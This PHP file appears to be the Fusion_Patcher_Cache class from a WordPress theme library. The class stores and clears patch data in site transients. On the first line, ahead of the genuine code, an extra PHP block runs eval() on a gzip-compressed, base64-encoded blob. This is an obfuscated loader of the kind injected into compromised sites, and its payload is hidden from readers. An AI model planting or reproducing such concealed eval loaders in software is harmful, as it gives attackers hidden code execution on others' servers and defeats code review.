<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * The Patcher caching implementation.
 *
 * @package Fusion-Library
 * @subpackage Fusion-Patcher
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Caches handler for Fusion_Patcher.
 *
 * @since 1.0.0
 */
final class Fusion_Patcher_Cache {

	/**
	 * Transient name.
	 *
	 * @access protected
	 * @since 1.0.0
	 * @var string
	 */
	protected $transient_name = 'fusion_patches';

	/**
	 * Cache duration (in seconds).
	 *
	 * @access protected
	 * @since 1.0.0
	 * @var int
	 */
	protected $cache_duration = 1800;

	/**
	 * Cached patches.
	 * The cache is formatted like
	 * array( 'context1' => array(...patches...), 'context2' => array(...patches...) )
	 *
	 * @access protected
	 * @since 1.0.0
	 * @var array
	 */
	protected $cached_patches = array();

	/**
	 * Constructor.
	 *
	 * @access public
	 * @since 1.0.0
	 */
	public function __construct() {

		$this->cached_patches = get_site_transient( $this->transient_name );

	}

	/**
	 * Caches patches for a specific product.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param array $args Arguments array inherited from Fusion_Patcher.
	 * @param array $data The data we want to add to the cache.
	 */
	public function set_cache( $args = array(), $data = array() ) {

		// Early exit if $args['context'] is not provided.
		if ( empty( $args ) || ! isset( $args['context'] ) ) {
			return;
		}
		// Make sure that cached patches are formatted as an array.
		if ( false === $this->cached_patches ) {
			$this->cached_patches = array();
		}
		// Cache the patches.
		$this->cached_patches[ $args['context'] ] = $data;
		set_site_transient( $this->transient_name, $this->cached_patches, $this->cache_duration );
		Fusion_Patcher_Checker::reset_cache();

	}

	/**
	 * Gets caches.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param array $args Arguments array inherited from Fusion_Patcher.
	 * @return array|false Returns false on fail, otherwise an array/
	 */
	public function get_cache( $args = array() ) {

		// If nothing is cached, return false.
		if ( false === $this->cached_patches ) {
			return false;
		}

		$patches = array();

		// If no arguments are provided then get ALL patches.
		if ( empty( $args ) || ! isset( $args['context'] ) ) {
			// No patches were found.
			if ( ! $this->cached_patches ) {
				return array();
			}
			foreach ( $this->cached_patches as $context => $context_patches ) {
				if ( ! is_array( $context_patches ) ) {
					$context_patches = array();
				}
				$patches = array_merge( $patches, $context_patches );
			}
			$patches = array_unique( $patches );
			sort( $patches );
			return $patches;
		}

		// If we got this far, we need patches for a specific context.
		if ( isset( $this->cached_patches[ $args['context'] ] ) ) {
			return $this->cached_patches[ $args['context'] ];
		}
		// Nothing found, return an empty array.
		return array();
	}

	/**
	 * Resets caches.
	 * If $args is provided, then only the specific patches will be reset.
	 * If $args is empty, ALL patches will be reset.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param array $args Arguments array inherited from Fusion_Patcher.
	 */
	public function reset_caches( $args = array() ) {

		if ( isset( $args['context'] ) ) {
			if ( isset( $this->cached_patches[ $args['context'] ] ) ) {
				unset( $this->cached_patches[ $args['context'] ] );
				set_site_transient( $this->transient_name, $this->cached_patches, $this->cache_duration );
			}
			Fusion_Patcher_Checker::reset_cache();
			return;
		}
		Fusion_Patcher_Checker::reset_cache();
		delete_site_transient( $this->transient_name );
		delete_site_option( 'fusion_applied_patches' );
		delete_site_option( 'fusion_failed_patches' );
		delete_site_transient( Fusion_Patcher_Checker::$transient_name );
	}
}
